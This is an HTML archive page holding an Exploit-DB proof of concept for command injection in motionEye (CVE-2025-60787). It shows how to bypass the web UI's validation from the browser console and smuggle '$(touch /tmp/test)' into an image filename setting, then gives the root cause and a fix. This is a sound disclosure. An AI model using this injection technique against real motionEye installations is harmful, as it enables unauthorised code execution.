@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="lin">
+<head>
+<meta charset="UTF-8">
+<title>OffSec’s Exploit Database Archive</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.8; color: #e2e8f0; max-width: 800px; margin: 40px auto; padding: 0 20px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.5em; }
+  .metadata { color: #94a3b8; font-size: 0.9em; margin-bottom: 2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 1em; }
+  img { max-width: 100%; height: auto; border-radius: 8px; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 1em; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 15px; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 6px; overflow-x: auto; }
+</style>
+</head>
+<body>
+  <h1>OffSec’s Exploit Database Archive</h1>
+  <div class="metadata">
+    Source: Exploit-DB | Date: 2/11/2026 | Lang: LIN |
+    <a href="https://www.exploit-db.com/exploits/52481" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div>
+
+                        
+                        <pre><code># Exploit Title: motionEye 0.43.1b4 - RCE 
+# Exploit PoC: motionEye RCE via client-side validation bypass (safe PoC)
+# Filename: motioneye_rce_poc_edb.txt
+# Author: prabhatverma47
+# Date tested: 2025-05-14 (original test); prepared for submission: 2025-10-11
+# Affected Versions: motionEye &lt;= 0.43.1b4
+# Tested on: Debian host running Docker; motionEye image ghcr.io/motioneye-project/motioneye:edge
+# CVE(s) / References: MITRE/OSV advisories referenced: CVE-2025-60787 
+#
+# Short description:
+# Client-side validation in motionEye's web UI can be bypassed via overriding the JS validation
+# function. Arbitrary values (including shell interpolation syntax) can be saved into the
+# motion config. When motion is restarted, the motion process interprets the config and
+# can execute shell syntax embedded inside configuration values such as "image_file_name".
+#
+# Safe PoC: creates a harmless file /tmp/test inside container (non-destructive).
+#
+# Environment setup:
+# 1) Start the motionEye docker image:
+#    docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
+#
+# 2) Verify version in logs:
+#    docker logs motioneye | grep "motionEye server"
+#    Expect: 0.43.1b4 (or &lt;= 0.43.1b4 for vulnerable)
+#
+# 3) Access web UI:
+#    Open http://127.0.0.1:9999
+#    Login: admin (blank password in default/edge image)
+#
+# Reproduction (manual + safe PoC):
+# A) Bypass client-side validation in browser console:
+#    1) Open browser devtools on the dashboard (F12 / Ctrl+Shift+I).
+#    2) In the Console tab paste and run:
+#
+#       configUiValid = function() { return true; };
+#
+#    This forces the UI validation function to always return true and allows any value
+#    to be accepted by the UI forms.
+#
+# B) Safe payload (paste this into Settings → Still Images → Image File Name and Apply):
+#    $(touch /tmp/test).%Y-%m-%d-%H-%M-%S
+#
+#    After applying, the PoC triggers creation of /tmp/test inside the motionEye container
+#    (the "touch" is executed when motion re-reads the config / motionctl restarts).
+#
+# C) Verify from host:
+#    docker exec -it motioneye ls -la /tmp | grep test
+#
+# Expected result:
+#    /tmp/test exists (created with the permissions of the motion process).
+#
+# Notes / root cause:
+# - UI stores un-sanitized values into camera-*.conf (e.g., picture_filename),
+#   which are later parsed by motion and interpreted as filenames – shell meta is executed.
+# - Fix: sanitize/whitelist filename characters (example sanitization provided in README).
+#
+# References:
+# - Original PoC &amp; writeup: https://github.com/prabhatverma47/motionEye-RCE-through-config-parameter
+# - motionEye upstream: https://github.com/motioneye-project/motioneye
+# - OSV/GHSA advisories referencing this issue (published May–Oct 2025)
+# - NVD entries: CVE-2025-60787
+            </code></pre>
+
+                    </div></div>
+  </div>
+</body>
+</html>
